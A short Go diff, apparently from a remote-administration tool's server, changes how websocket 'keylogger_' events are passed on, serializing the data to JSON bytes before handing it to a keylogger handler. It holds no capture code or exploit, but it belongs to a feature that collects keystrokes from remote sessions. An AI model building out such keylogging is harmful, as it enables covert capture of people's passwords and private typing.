@@ -211,7 +211,8 @@ func wsOnMessageBinary(session *melody.Session, data []byte) {
 	
 	// Handle keylogger events
 	if strings.HasPrefix(pack.Act, "keylogger_") {
-		keylogger.HandleKeyloggerEvent(session.UUID, pack.Act, pack.Data)
+		dataBytes, _ := utils.JSON.Marshal(pack.Data)
+		keylogger.HandleKeyloggerEvent(session.UUID, pack.Act, dataBytes)
 	}
 	
 	common.CallEvent(pack, session)
